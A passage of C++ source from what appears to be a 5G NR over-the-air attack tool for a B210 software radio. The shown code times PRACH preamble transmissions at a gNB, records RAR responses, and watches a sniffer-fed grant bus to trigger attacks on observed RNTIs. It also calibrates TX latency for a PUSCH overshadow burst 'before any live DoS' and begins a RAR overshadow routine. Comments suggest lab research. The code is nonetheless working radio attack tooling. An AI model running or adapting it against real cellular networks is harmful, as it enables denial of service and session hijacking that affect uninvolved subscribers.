                                   cfg_.prach.msg1_frequency_start_prb, eff_cfo);
        if (burst.samples.empty()) {
          std::cerr << "[prach] burst synthesis failed\n";
          return 1;
        }
        double pk = 0.0, rms = 0.0;
        for (const auto& v : burst.samples) {
          pk = std::max(pk, (double)std::abs(v));
          rms += std::norm(v);
        }
        rms = std::sqrt(rms / burst.samples.size());
        if (!burst_built) {
          std::printf("%s [prach] preamble: %zu samples (%.0f us) f0_bin=%lld "
                      "cfo_comp=%.0f Hz resid=%+.1f Hz hash=%016llx rms=%.3f peak=%.3f\n",
                      wall_ts().c_str(),
                      burst.samples.size(), burst.duration_sec * 1e6,
                      static_cast<long long>(burst.f0_bin), eff_cfo,
                      burst.cfo_residual_hz,
                      static_cast<unsigned long long>(burst_hash(burst.samples)),
                      rms, pk);
        }
        built_cfo = eff_cfo;
        built_rapid = rapid_eff;
        burst_built = true;
      }

      // Arm the next PRACH occasion against the LIVE device clock, not the
      // RX-stream stamp. rx_global_sample trails the real time by the whole RX
      // pipeline (observed ~350 ms), so scheduling off it picked occasions that
      // were already in the past and the burst missed its slot.
      constexpr double kMinPrachLeadSec = 0.001;   // UHD timed TX anchor lead
      const double now_sec = radio.uhd_now_sec();
      const uint64_t now_sample = rx_sample_from_time(now_sec, cfg_.sample_rate);
      // Within-run slot sweep: each send targets the next slot 0..19 from the
      // base, so one lock covers the whole frame (the beam lottery moves the
      // working slot per lock; exactly one value maps to the gNB occasion).
      // Skipped occasions (too-near gate) don't advance `sent`, so the cycle
      // only steps on actual transmissions.
      const uint8_t eff_slot = cfg_.prach.sweep_occasion_slots
          ? static_cast<uint8_t>((cfg_.prach.occasion_slot + sent) % 20)
          : cfg_.prach.occasion_slot;
      const uint64_t occ = nr::next_prach_occasion_start(
          sync.frame_start_sample(), sync.samples_per_slot(), now_sample,
          eff_slot);
      const uint64_t occ_slot = static_cast<uint64_t>(std::llround(
          static_cast<double>(occ - sync.frame_start_sample()) / sync.samples_per_slot()));
      if (occ_slot != last_armed_slot) {
        last_armed_slot = occ_slot;
        // Hard stop: once occasion_count sends are out, no more TX — the loop
        // only stays alive to drain an armed capture (bounded below). The old
        // code kept transmitting while capture_armed (134 sends for count=5).
        const bool count_hit =
            cfg_.prach.occasion_count && sent >= cfg_.prach.occasion_count;
        const double occ_sec = rx_time_from_sample(occ, cfg_.sample_rate);
        const double tx_sec = occ_sec - cfg_.symbol_advance_us / 1e6;
        const double ahead = tx_sec - now_sec;
        if (ahead < kMinPrachLeadSec) {
          // Too close to anchor a timed burst; the next frame's occasion will
          // be taken instead.
          if (!armed_any)
            std::printf("[prach] slot %llu too near (%.2f ms) — taking next occasion\n",
                        (unsigned long long)occ_slot, ahead * 1e3);
        } else if (ahead > 0.1) {
          if (!armed_any)
            std::printf("[prach] next occasion slot=%llu in %.0f ms — will arm as it "
                        "approaches\n", (unsigned long long)occ_slot, ahead * 1e3);
          } else {
            // count_hit gates TRANSMISSION only: the loop stays alive below
            // to drain an armed capture (bounded), but no new bursts go out.
            const bool may_tx = !count_hit;
            if (may_tx && cfg_.dry_run) {
              std::printf("[prach] DRY: preamble->slot=%llu (frame=%llu subframe=%d) "
                          "rapid=%u tx_time=%+.3f ms\n",
                          (unsigned long long)occ_slot,
                          (unsigned long long)(occ_slot / 20), (int)((occ_slot % 20) / 2),
                          rapid_eff,
                          (tx_sec - radio.uhd_now_sec()) * 1e3);
            } else if (may_tx) {
            radio.transmit_timed(burst.samples, tx_sec);
            std::printf("%s [prach] TX preamble -> slot=%llu (frame=%llu subframe=%d) "
                        "rapid=%u ahead=%.3f ms (sent %llu) cfo=%.0f Hz\n",
                        wall_ts().c_str(),
                        (unsigned long long)occ_slot,
                        (unsigned long long)(occ_slot / 20), (int)((occ_slot % 20) / 2),
                        rapid_eff,
                        (tx_sec - radio.uhd_now_sec()) * 1e3, (unsigned long long)(sent + 1),
                        eff_cfo);
          }
          if (may_tx) {
            armed_any = true;
            last_tx_cfo = eff_cfo;
            ++sent;
          }
          if (cfg_.prach.dither_cfo && dither_steps > 1) {
            ++dither_idx;
            // One line per completed sweep, so the cadence and coverage are
            // visible without flooding the log with every step.
            if ((dither_idx % dither_steps) == 0u) {
              ++dither_passes;
              std::printf("[prach] dither: pass %llu done — steps=%u range "
                          "[%.0f, %.0f] step=%.0f Hz center=%.0f cfo_avg=%.0f Hz/%u\n",
                          (unsigned long long)dither_passes, dither_steps,
                          cfo_center - cfg_.prach.dither_halfspan_hz,
                          cfo_center + cfg_.prach.dither_halfspan_hz,
                          cfg_.prach.dither_step_hz, cfo_center,
                          sync.cfo_frames() ? sync.cfo_avg_hz() : cfo_hz,
                          (unsigned)sync.cfo_frames());
            }
          }
          // Hard stop on occasion_count: transmission already gated above, so
          // reaching the count with no armed capture ends the run. An armed
          // capture (or the tail below) gets a bounded wall-clock drain, then
          // the run ends with whatever was written — never an unbounded loop.
          if (count_hit) {
            // Tail recording (once, only when nothing is armed): the dilated
            // gNB flushes RARs seconds after the sends, long after any
            // occasion window ends. Open a tail window so the backlog lands
            // on disk instead of in the void. Sizing is a disk trade: full
            // rate costs ~184 MB/s — keep drain_sec modest unless /tmp has
            // room (df first!).
            if (!tail_armed && !capture_armed &&
                !cfg_.prach.rar_capture_dir.empty()) {
              tail_armed = true;
              ++capture_attempt;
              capture_from = rx_global_sample;
              captured = 0;
              capture_file_start = capture_from;
              capture_win_samples =
                  (uint64_t)(cfg_.prach.rar_capture_drain_sec * cfg_.sample_rate);
              capture_armed = true;
              char tailbuf[192];
              std::snprintf(tailbuf, sizeof tailbuf, "%s/rar_tail_a%llu.cf32",
                            cfg_.prach.rar_capture_dir.c_str(),
                            static_cast<unsigned long long>(capture_attempt));
              last_capture_path = tailbuf;
              cap_file.open(last_capture_path,
                            std::ios::binary | std::ios::trunc);
              std::printf("%s [prach] RAR tail recording: %s from rx-abs=%llu "
                          "(%.0f s at %.0f MS/s)\n",
                          wall_ts().c_str(), last_capture_path.c_str(),
                          (unsigned long long)capture_from,
                          cfg_.prach.rar_capture_drain_sec, cfg_.sample_rate / 1e6);
            }
            if (!capture_armed) {
              std::cout << wall_ts() << " [prach] occasion_count reached — stopping\n";
              break;
            }
            if (drain_deadline_sec == 0.0)
              drain_deadline_sec = now_sec + cfg_.prach.rar_capture_drain_sec;
            if (now_sec > drain_deadline_sec) {
              if (cap_file.is_open()) cap_file.close();
              capture_armed = false;
              last_captured = captured;
              std::cout << wall_ts() << " [prach] occasion_count reached — "
                        << "capture drain timeout, stopping (wrote " << captured
                        << " samples)\n";
              break;
            }
            std::cout << wall_ts() << " [prach] occasion_count reached — finishing RAR capture\n";
          }
          // Capture the OTA RAR window for offline decode: the slot right after
          // the occasion carries the gNB's RAR PDCCH+PDSCH (gNB logs [X.9] PRACH
          // then [X.10] RAR). File sample 0 = a real slot boundary, so offline
          // `--no-sync --slot N` sweep N 0..19 finds the gNB slot numbering.
          // NOTE: no CFO-match gate here on purpose. An earlier revision only
          // armed when |tx_cfo - cfo_comp| < step, which silently disabled ALL
          // capturing under auto_cfo (or any manual comp != yaml default) and
          // ate confirmed RARs. Every transmitted burst is intentional; the
          // actually-used CFO is already printed on the arm line.
          if (!cfg_.prach.rar_capture_dir.empty() && !capture_done && !capture_armed &&
            armed_any && sent >= 1) {
            // RX stamps ARE device time (recv_timed returns UHD's per-buffer
            // time spec), so the air event at the occasion sits at rx-sample
            // == occ — there is NO pipeline offset to subtract. Subtracting
            // rx_lag put the windows up to a pipeline delay (~160 ms..1.5 s)
            // EARLY and the files never contained the preamble/RAR. Start one
            // slot before the occasion for numbering margin; the loop re-arms
            // on overshoot since the RX head here jumps unpredictably.
            const uint64_t sps = sync.samples_per_slot();
            const uint64_t pre =
                (uint64_t)cfg_.prach.rar_capture_pre_slots * sps;
            capture_from      = occ > pre ? occ - pre : 0;
            captured          = 0;
            capture_file_start = capture_from;
            capture_win_samples = (cfg_.prach.rar_capture_window_slots
                                       ? cfg_.prach.rar_capture_window_slots
                                       : 4ull) * sps;
            capture_armed     = true;
            ++capture_attempt;
            // Numbered files, never destructive: every attempt (including the
            // first) gets a unique name, so no run can ever erase another
            // run's evidence (an attempt-1 trunc once destroyed the only file
            // holding confirmed RARs). Decode targets: newest via `ls -t`.
            std::string path;
            {
              char namebuf[192];
              unsigned suffix = 0;
              for (;;) {
                if (suffix == 0)
                  std::snprintf(namebuf, sizeof namebuf, "%s/rar_window_s%llu_a%llu.cf32",
                                cfg_.prach.rar_capture_dir.c_str(),
                                static_cast<unsigned long long>(occ_slot),
                                static_cast<unsigned long long>(capture_attempt));
                else
                  std::snprintf(namebuf, sizeof namebuf, "%s/rar_window_s%llu_a%llu_%u.cf32",
                                cfg_.prach.rar_capture_dir.c_str(),
                                static_cast<unsigned long long>(occ_slot),
                                static_cast<unsigned long long>(capture_attempt), suffix);
                std::ifstream probe(namebuf);
                if (!probe.good()) break;
                if (++suffix >= 100) break;
              }
              path = namebuf;
            }
            last_capture_path = path;
            cap_file.open(path, std::ios::binary | std::ios::trunc);
            std::printf("%s [prach] RAR capture: %s %u slots from slot %llu (rx-abs=%llu "
                        "now-rx lag=%lld samp), cfo=%.1f Hz (attempt %llu)\n",
                        wall_ts().c_str(),
                        path.c_str(), cfg_.prach.rar_capture_window_slots
                            ? cfg_.prach.rar_capture_window_slots : 4,
                        (unsigned long long)occ_slot,
                        (unsigned long long)capture_from, (long long)(now_sample -
                        (long long)rx_global_sample), last_tx_cfo,
                        static_cast<unsigned long long>(capture_attempt));
          }
        }
      }

      // Copy the RX buffers covering the RAR window into the capture file.
      if (capture_armed) {
        const uint64_t buf_start = rx_global_sample;   // UHD stamps buffer start
        const uint64_t buf_end   = buf_start + n;
        const uint64_t win       = capture_win_samples;
        const uint64_t t_start   = capture_from;
        const uint64_t t_end     = capture_from + win;
        if (buf_start >= t_end) {
          // The RX head jumped straight past the whole window (stall + catch-up):
          // drop this target and re-arm on the next occasion that sweeps by.
          // The partial file is KEPT (numbered, never truncated by re-arms).
          if (cap_file.is_open()) cap_file.close();
          capture_armed  = false;
          last_captured  = captured;
          ++capture_overshoots;
          captured       = 0;
          std::printf("%s [prach] RAR capture: RX overshot window %llu..%llu "
                      "(head=%llu) - re-arming (kept %llu samples in %s from abs %llu)\n",
                      wall_ts().c_str(),
                      (unsigned long long)t_start, (unsigned long long)t_end,
                      (unsigned long long)buf_start,
                      (unsigned long long)last_captured, last_capture_path.c_str(),
                      (unsigned long long)capture_file_start);
        } else if (buf_end > t_start) {
          const uint64_t lo = buf_start > t_start ? buf_start : t_start;
          const uint64_t hi = buf_end < t_end ? buf_end : t_end;
          if (captured == 0) capture_file_start = lo;
          // A mid-file time gap (overflow jump) would otherwise be written
          // contiguously and silently corrupt slot alignment offline: mark it.
          const uint64_t expected = capture_file_start + captured;
          if (lo != expected) {
            ++capture_gaps;
            if (lo > expected) capture_gap_samples += lo - expected;
            std::printf("%s [prach] RAR capture: gap of %lld samples before abs %llu "
                        "(attempt %llu)\n",
                        wall_ts().c_str(), (long long)lo - (long long)expected,
                        (unsigned long long)lo,
                        static_cast<unsigned long long>(capture_attempt));
          }
          // Contiguous span write (buf holds complex<float> = interleaved cf32).
          // Never rewrite already-written samples: a backtracked buffer
          // (lo < expected after an out-of-order stamp) would otherwise
          // duplicate a segment and break slot alignment for the rest of
          // the file while looking perfectly healthy.
          const uint64_t wlo = lo > expected ? lo : expected;
          if (wlo < hi) {
            const std::size_t off = static_cast<std::size_t>(wlo - buf_start);
            cap_file.write(reinterpret_cast<const char*>(buf.data() + off),
                           static_cast<std::streamsize>((hi - wlo) * sizeof(Sample)));
            captured += hi - wlo;
          }
          if (buf_end >= t_end) {
            cap_file.close();
            capture_armed = false;
            capture_done  = true;
            last_captured = captured;
            std::printf("%s [prach] RAR capture done: %llu samples, file sample 0 = "
                        "abs %llu (slot %llu), head-trim %llu samp, cfo=%.1f Hz gaps=%llu gap_samples=%llu\n",
                        wall_ts().c_str(),
                        (unsigned long long)captured,
                        (unsigned long long)capture_file_start,
                        (unsigned long long)((capture_file_start - sync.frame_start_sample())
                            / sync.samples_per_slot()),
                        (unsigned long long)(capture_file_start - capture_from),
                        last_tx_cfo,
                        static_cast<unsigned long long>(capture_gaps),
                        static_cast<unsigned long long>(capture_gap_samples));
          }
        }
      }

      // OTA proof for the live RAR decoder: scan the RX stream for the gNB's
      // Msg2 (RAR PDCCH->PDSCH->MAC) that this preamble must have triggered.
      // Skipped for pure capture runs (live_scan=false): the scan costs a full
      // demod+decode per buffer and is the main RX-stall source, while being
      // slot-blind on unaligned stream buffers (decode() defaults to slot 0),
      // so it never fires there anyway — it only destroys captures.
      if (cfg_.prach.live_scan && sync.locked() && (rounds % 2u) == 0u) {
        mon.scan_buffer(buf);
      }
      ++rounds;
    }

    if (cap_file.is_open()) cap_file.close();
    radio.stop_streaming();
    std::cout << wall_ts() << " [prach] summary: locked=" << (sync.locked() ? "yes" : "no")
              << " preambles_sent=" << sent
              << " tx_underrun=" << radio.tx_underrun_count()
              << " rx_overflow=" << radio.rx_overflow_count()
              << " rx_lost=" << radio.rx_lost_count()
              << " dither_passes=" << dither_passes
              << " cfo_frames=" << sync.cfo_frames()
              << " cfo_avg=" << (sync.cfo_frames() ? sync.cfo_avg_hz() : cfo_hz)
              << " Hz capture_attempts=" << capture_attempt
              << " overshoots=" << capture_overshoots
              << " gaps=" << capture_gaps
              << " gap_samples=" << capture_gap_samples
              << " last_file=" << (last_capture_path.empty() ? "-" : last_capture_path)
              << " last_bytes=" << (last_captured * sizeof(Sample))
              << "\n";
    return sent > 0 || cfg_.dry_run ? 0 : 1;
  } catch (const std::exception& e) {
    std::cerr << "[prach] " << e.what() << "\n";
    return 1;
  }
}

static RarEvent parse_bus_line(const std::string& line)
{
  RarEvent ev;
  static const std::regex rapid_re(R"("rapid"\s*:\s*(\d+))");
  static const std::regex crnti_re(R"("c_rnti"\s*:\s*(\d+))");
  static const std::regex freq_re(R"("pusch_freq_res"\s*:\s*(\d+))");
  static const std::regex k_re(R"("k"\s*:\s*(\d+))");
  static const std::regex mcs_re(R"("mcs"\s*:\s*(\d+))");
  std::smatch m;
  if (std::regex_search(line, m, rapid_re)) ev.rapid = static_cast<uint8_t>(std::stoi(m[1].str()));
  if (std::regex_search(line, m, crnti_re)) {
    ev.c_rnti = static_cast<uint16_t>(std::stoi(m[1].str()));
    ev.grant.rnti = ev.c_rnti;
  }
  if (std::regex_search(line, m, freq_re)) {
    ev.ul_dci.pusch_freq_res = static_cast<uint16_t>(std::stoi(m[1].str()));
    ev.grant.pusch_freq_res = ev.ul_dci.pusch_freq_res;
  }
  if (std::regex_search(line, m, k_re)) ev.grant.k = static_cast<uint8_t>(std::stoi(m[1].str()));
  if (std::regex_search(line, m, mcs_re)) {
    ev.ul_dci.mcs = static_cast<uint8_t>(std::stoi(m[1].str()));
    ev.grant.mcs = ev.ul_dci.mcs;
  }
  ev.grant.tbs_bits = 264;
  return ev;
}

int AttackEngine::run_bus()
{
  std::cout << "[bus] watching grant bus: " << cfg_.grant_bus << "\n";
  std::cout << "[bus] pair with: bash scripts/start-sniffer.sh tail\n";

  { std::ofstream create(cfg_.grant_bus, std::ios::app); }

  std::size_t last_pos = 0;
  std::set<uint32_t> seen;
  std::shared_ptr<RadioUhd> radio;
  if (!cfg_.dry_run) {
    try {
      radio = std::make_shared<RadioUhd>(cfg_);
      radio->start_streaming();
      set_shared_radio(radio);
    } catch (const std::exception& e) {
      std::cerr << "[bus] radio init failed: " << e.what() << " — dry-run fallback\n";
      cfg_.dry_run = true;
    }
  }

  while (!stop_.load()) {
    std::ifstream in(cfg_.grant_bus);
    if (!in) {
      std::this_thread::sleep_for(std::chrono::milliseconds(50));
      continue;
    }
    in.seekg(0, std::ios::end);
    const auto end = static_cast<std::size_t>(in.tellg());
    if (end <= last_pos) {
      std::this_thread::sleep_for(std::chrono::milliseconds(50));
      continue;
    }
    in.seekg(static_cast<std::streamoff>(last_pos));
    std::string line;
    while (std::getline(in, line)) {
      if (line.empty()) continue;
      auto ev = parse_bus_line(line);
      if (ev.c_rnti == 0) continue;
      const uint32_t key = (static_cast<uint32_t>(ev.rapid) << 16) | ev.c_rnti;
      if (seen.count(key)) continue;
      seen.insert(key);
      execute_attack(ev);
    }
    last_pos = end;
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
  }

  if (radio) {
    radio->stop_streaming();
    set_shared_radio(nullptr);
  }
  return 0;
}

int AttackEngine::run_loopback()
{
  // Step 4: validate the TX->RX timing chain on the single B210 before any
  // live DoS. TX on A, RX on B (coherent shared LO), antennas ~5 cm apart,
  // TX gain ~0 for the first run. The marker burst stands in for the real
  // PUSCH overshadow burst — the latency math is burst-content independent,
  // so the harness result transfers directly to execute_attack()'s advance.
  std::cout << "[loopback] single B210 cross-chain: TX " << cfg_.tx_subdev
            << " -> RX " << cfg_.rx_subdev
            << ", antennas near-field, TX gain ~0 first\n";

  nr::Ofdm tx_ofdm(cfg_.sample_rate, cfg_.scs_khz * 1000.0, 51);
  const SampleBuffer marker0 = nr::synth_ssb_slot(tx_ofdm, cfg_.pci);
  // Scale the marker up so a near-field TX gain-0 RX still carries a strong
  // correlation peak above the RX noise floor / DC.
  SampleBuffer marker = marker0;
  if (cfg_.loopback_tx_scale > 1.0)
    for (auto& v : marker) v *= static_cast<float>(cfg_.loopback_tx_scale);
  std::printf("[loopback] marker: %zu samples, tx_scale=%.1f avg_amp=%.4f\n",
              marker.size(), cfg_.loopback_tx_scale,
              std::sqrt(std::accumulate(marker.begin(), marker.end(), 0.0,
                                        [](double a, const Sample& s){ return a + std::norm(s); })
                        / marker.size()));

  if (cfg_.dry_run) {
    // Synthetic RX: noise floor + the marker injected at a known offset.
    const size_t inject_at = 150000u;
    const double expect_us = inject_at / cfg_.sample_rate * 1e6;
    SampleBuffer rx = nr::synth_noise(300000);
    for (size_t t = 0; t < marker.size() && inject_at + t < rx.size(); ++t)
      rx[inject_at + t] += 25.0f * marker[t];

    auto r = measure_latency(marker, rx, cfg_.sample_rate, 0, rx.size());
    std::printf("[loopback] dry-run: found=%s at=%zu corr=%.3f delay=%.1fus (expect %.1fus)\n",
                r.found ? "yes" : "no", r.arrival_sample, r.corr,
                r.delay_sec * 1e6, expect_us);
    if (!r.found || std::abs(r.delay_sec * 1e6 - expect_us) > 1.0) {
      std::cerr << "[loopback] dry-run FAILED — latency harness broken\n";
      return 1;
    }
    std::cout << "[loopback] dry-run PASS\n";
    return 0;
  }

  try {
    RadioUhd radio(cfg_);
    radio.sync_time(0.0);
    std::cout << "[loopback] device time zeroed (set_time_now=0) for shared TX/RX epoch\n";
    radio.start_streaming();

    // --- TX RF probe: is the TX chain actually radiating? ---
    // Uses a proper continuous burst (start-of-burst on packet 1, end-of-burst
    // on packet N only) driven at several amplitudes. If the DAC+upconverter
    // are live, the RX RSSI/rms must rise monotonically with amplitude.
    if (cfg_.loopback_probe)
    {
      constexpr double kPi = 3.14159265358979323846;
      std::printf("[loopback] config: tx_gain=%.1f rx_gain=%.1f (device: tx_gain=%.1f "
                  "rx_gain=%.1f) tx_freq=%.1f MHz rx_freq=%.1f MHz tx_ant=%s rx_ant=%s "
                  "(want %s -> %s)\n",
                  cfg_.tx_gain, cfg_.rx_gain,
                  radio.get_tx_gain(), radio.get_rx_gain(),
                  radio.get_tx_freq_hz() / 1e6, radio.get_rx_freq_hz() / 1e6,
                  radio.get_tx_antenna().c_str(), radio.get_rx_antenna().c_str(),
                  cfg_.tx_subdev.c_str(), cfg_.rx_subdev.c_str());
      std::printf("[loopback] sensors: TX lo_locked=%s RX lo_locked=%s tx_temp=%s rx_temp=%s\n",
                  radio.get_tx_sensor("lo_locked").c_str(),
                  radio.get_rx_sensor("lo_locked").c_str(),
                  radio.get_tx_sensor("temp").c_str(),
                  radio.get_rx_sensor("temp").c_str());

      const double dur = 0.15;
      const double f = 1.0e6;
      const size_t CH = 262144;
      SampleBuffer cw(static_cast<size_t>(dur * cfg_.sample_rate));
      for (size_t t = 0; t < cw.size(); ++t) {
        const double ph = 2.0 * kPi * f * static_cast<double>(t) / cfg_.sample_rate;
        cw[t] = Sample(std::cos(ph), std::sin(ph));
      }

      auto sweep = [&](float amp, const char* tag, bool timed) {
        // Baseline: 40 ms before the burst.
        SampleBuffer cap;
        cap.reserve(static_cast<size_t>((dur + 0.12) * cfg_.sample_rate));
        double t_cap0 = 0.0;
        bool anchor = false;
        const size_t base_len = static_cast<size_t>(0.04 * cfg_.sample_rate);
        SampleBuffer pkt(65536);
        while (cap.size() < base_len) {
          double tp = 0.0; bool g = false;
          const std::size_t n = radio.recv_timed(pkt, 0.05, g, tp);
          if (!g || n == 0) continue;
          if (!anchor) { t_cap0 = tp; anchor = true; }
          cap.insert(cap.end(), pkt.begin(), pkt.begin() + static_cast<std::ptrdiff_t>(n));
        }
        const double t_key = radio.uhd_now_sec();
        const std::string rssi_pre = radio.get_rx_sensor("rssi");

        if (timed) {
          SampleBuffer cwt(cw);
          for (auto& v : cwt) v *= amp;
          radio.transmit_timed(cwt, t_key + 0.02);
        } else {
          // Proper burst framing: start flag on first packet only, end on last.
          const size_t n_pkt = (cw.size() + CH - 1) / CH;
          SampleBuffer seg;
          for (size_t p = 0; p < n_pkt; ++p) {
            const size_t off = p * CH;
            const size_t cnt = std::min(CH, cw.size() - off);
            seg.assign(cw.begin() + static_cast<std::ptrdiff_t>(off),
                       cw.begin() + static_cast<std::ptrdiff_t>(off + cnt));
            for (auto& v : seg) v *= amp;
            radio.transmit_seg(seg, p == 0, p + 1 == n_pkt);
          }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(60));
        const std::string rssi_dur = radio.get_rx_sensor("rssi");

        while (cap.size() < (dur + 0.12) * cfg_.sample_rate) {
          double tp = 0.0; bool g = false;
          const std::size_t n = radio.recv_timed(pkt, 0.05, g, tp);
          if (!g || n == 0) continue;
          cap.insert(cap.end(), pkt.begin(), pkt.begin() + static_cast<std::ptrdiff_t>(n));
        }
        auto rms_span = [&](size_t a, size_t b) {
          double e = 0.0;
          if (a >= b || b > cap.size()) return 0.0;
          for (size_t k = a; k < b; ++k) e += std::norm(cap[k]);
          return std::sqrt(e / (b - a));
        };
        const double r_base = rms_span(0, base_len);
        const double off0 = ((timed ? t_key + 0.02 : t_key) - t_cap0) * cfg_.sample_rate;
        const size_t pre = static_cast<size_t>(0.01 * cfg_.sample_rate);
        size_t s_off = off0 > pre ? static_cast<size_t>(off0) - pre : 0;
        const size_t d_b = s_off + 2 * pre;
        const size_t d_e = s_off + static_cast<size_t>(dur * cfg_.sample_rate) - pre;
        const double r_dur = (d_b < d_e && d_e <= cap.size()) ? rms_span(d_b, d_e) : r_base;
        const double delta_db = 20.0 * std::log10(r_dur / (r_base + 1e-12));
        std::printf("[loopback] TX probe [%s amp=%.1f]: base=%.5f during=%.5f "
                    "delta=%+.1f dB | rssi %s -> %s\n",
                    tag, amp, r_base, r_dur, delta_db,
                    rssi_pre.c_str(), rssi_dur.c_str());
        return r_dur / (r_base + 1e-12);
      };

      const double g1 = sweep(0.1f, "AMP", false);
      const double g2 = sweep(0.3f, "AMP", false);
      const double g3 = sweep(0.6f, "AMP", false);
      const double g4 = sweep(0.9f, "AMP", false);
      const double gT = sweep(0.6f, "TIMED", true);

      const bool monitors = (g1 + g2 + g3 + g4) / 4.0 > 1.06;  // average RSSI/dB ratio
      if (!monitors || gT < 1.2) {
        // Report but don't fail hard: we want the loop attempts even when RF is
        // questionable; the direct burst correlation is the real gate.
        if (!monitors)
          std::cerr << "[loopback] TX probe: RX did NOT see rising RF power with "
                       "amplitude. DAC/PA silent or no antenna on the TX port.\n";
        else if (g4 > g1)  // amplitude sweep monotone
          std::cout << "[loopback] TX probe: RF present, but timed TX silent.\n";
      } else {
        std::cout << "[loopback] TX probe: RF path OK — kicker emits.\n";
      }
    } else {
      std::cout << "[loopback] tx probe skipped (loopback.probe=false)\n";
    }

    const double window_sec = cfg_.loopback_window_ms * 1e-3;
    const size_t margin = static_cast<size_t>(0.25 * cfg_.sample_rate * window_sec);
    SampleBuffer acc;                 // RX accumulation spanning the TX moment
    SampleBuffer pkt(65536);
    double delay_sum_us = 0.0;
    uint32_t found_cnt = 0;
    bool has_delay = false;
    double t_min = 0.0, t_max = 0.0;
    const double sample_sec = 1.0 / cfg_.sample_rate;

    for (uint32_t it = 0; it < cfg_.loopback_iterations && !stop_.load(); ++it) {
      // A burst may occasionally be dropped (USB jitter) — retry the iteration
      // up to 5 times: we only need the arrival time of ONE actually-emitted
      // burst per slot for the latency measurement.
      bool done = false;
      bool rxgapped = false;
      for (int attempt = 0; attempt < 5 && !done && !stop_.load(); ++attempt) {
      // Schedule TX at an absolute time a bit ahead so the FPGA has one buffer
      // to retime into; each iteration advances by the window (no overlap).
      const double t_tx = radio.uhd_now_sec() + 0.010 + it * (2.0 * window_sec);
      radio.transmit_timed(marker, t_tx);

      // Accumulate a contiguous RX window spanning [t_tx - 0.25w, t_tx + 0.75w].
      acc.clear();
      const double want_t0 = t_tx - 0.25 * window_sec;
      const double want_t1 = t_tx + 0.75 * window_sec;
      double t_acc0 = 0.0;
      bool need_t0 = true;
      rxgapped = false;
      for (int guard = 0; guard < 400 && !stop_.load(); ++guard) {
        double t_pkt = 0.0;
        bool got = false;
        std::size_t n = radio.recv_timed(pkt, 0.05, got, t_pkt);
        if (!got || n == 0) continue;
        if (need_t0) {
          if (t_pkt < want_t0) continue;      // not into the window yet
          t_acc0 = t_pkt;
          need_t0 = false;
        } else {
          // Continuous-stream sanity: this packet must follow the previous one.
          const double exp_t = t_acc0 + acc.size() * sample_sec;
          const double drift = std::abs(t_pkt - exp_t) / sample_sec;
          if (drift > 128.0) {
            std::cout << "[loopback] RX gap " << drift
                      << " samples — retrying window\n";
            rxgapped = true;
            acc.clear();
            need_t0 = true;
            continue;
          }
        }
        acc.insert(acc.end(), pkt.begin(),
                   pkt.begin() + static_cast<std::ptrdiff_t>(n));
        const double covered = (acc.size()) * sample_sec;
        if (t_acc0 + covered >= want_t1) break;
      }
      if (acc.empty()) {
        std::cerr << "[loopback] no RX data captured\n";
        continue;
      }

      // The burst sits at (t_tx - t_acc0) samples into acc.
      const double expect_off = (t_tx - t_acc0) * cfg_.sample_rate;
      size_t lo = expect_off > margin ? static_cast<size_t>(expect_off - margin) : 0;
      if (lo >= acc.size()) lo = acc.size() > 0 ? acc.size() - 1 : 0;
      size_t window_len = 2 * margin;
      if (lo + window_len > acc.size()) window_len = acc.size() - lo;

      auto r = measure_latency(marker, acc, cfg_.sample_rate, lo, window_len);

      // Diagnostic dump of the RX window (cf32) when configured.
      if (!cfg_.loopback_dump_path.empty() && it == 0 && attempt == 0) {
        nr::write_cf32(cfg_.loopback_dump_path, acc);
        double pk = 0.0, rms = 0.0;
        for (const auto& v : acc) {
          pk = std::max(pk, (double)std::abs(v));
          rms += std::norm(v);
        }
        rms = std::sqrt(rms / acc.size());
        std::printf("[loopback] dump: %s samples=%zu rx_t0=%.6f expect_off=%.0f "
                    "rms=%.4f peak=%.4f SNR~%.1f dB\n",
                    cfg_.loopback_dump_path.c_str(), acc.size(), t_acc0, expect_off,
                    rms, pk, 20.0 * std::log10(pk / (rms + 1e-12)));
      }

      if (r.found) {
        const double t_arrive = t_acc0 + r.arrival_sample / cfg_.sample_rate;
        const double d_us = (t_arrive - t_tx) * 1e6;
        delay_sum_us += d_us;
        ++found_cnt;
        if (!has_delay) { t_min = t_max = d_us; has_delay = true; }
        else {
          t_min = std::min(t_min, d_us);
          t_max = std::max(t_max, d_us);
        }
        std::printf("[loopback] iter %u%s: tx=%.6f rx_t0=%.6f arrival=%.6f "
                    "delay=%+.1fus corr=%.3f (rx ovf=%llu lost=%llu txu=%llu)\n",
                    (unsigned)it, attempt ? "[retry]" : "",
                    t_tx, t_acc0, t_arrive, d_us, r.corr,
                    (unsigned long long)radio.rx_overflow_count(),
                    (unsigned long long)radio.rx_lost_count(),
                    (unsigned long long)radio.tx_underrun_count());
        if (it == 0 && d_us > 100.0)
          std::cout << "[loopback] tip: delay >> lightspeed — USB transport; "
                       "set symbol_advance_us to ~this value\n";
        done = true;
      } else if (attempt == 4) {
        std::printf("[loopback] iter %u: burst not recovered after 5 tries "
                    "(rx gap=%s tx=%.6f rx_t0=%.6f search=[%zu,%zu))\n",
                    (unsigned)it, rxgapped ? "yes" : "no", t_tx, t_acc0, lo,
                    lo + window_len);
        done = true;
      }
      }
      if (!done) break;   // stop flag hit mid-retry
    }

    radio.stop_streaming();

    if (found_cnt == 0) {
      std::cerr << "[loopback] no bursts recovered — check antennas/gain; "
                   "enable dump_path for a cf32 to inspect\n";
      return 1;
    }
    const double avg_us = delay_sum_us / found_cnt;
    std::printf("[loopback] summary: %u/%u bursts, delay min=%.1fus max=%.1fus avg=%.1fus\n",
                (unsigned)found_cnt, (unsigned)cfg_.loopback_iterations,
                t_min, t_max, avg_us);
    std::cout << "[loopback] use: symbol_advance_us = " << std::fixed
              << std::setprecision(0) << avg_us << " (or run the harness a few times)\n";
  } catch (const std::exception& e) {
    std::cerr << "[loopback] " << e.what() << "\n";
    return 1;
  }

  return 0;
}

int AttackEngine::run_collide()
{
  // Step 4b: software-victim RAR overshadow. With only one B210 + 2 antennas
  // there is no real gNB to attack, so we synthesize the lab gNB's RAR slot
  // (SSB + RAR PDCCH DM-RS + a message-2 payload region) and a CONFLICTING
  // copy (same SSB/PDCCH, message-2 payload 180 deg out of phase, louder).
  // The victim is our own RarDecoder + a message-2 correlation metric: a clean
  // RAR shows exactly one RAR PDCCH and one message-2 match; an overshadowed
  // window shows two (or the victim re-syncs to the hijacker's SSB).
  std::cout << "[collide] software-victim RAR overshadow: TX " << cfg_.tx_subdev
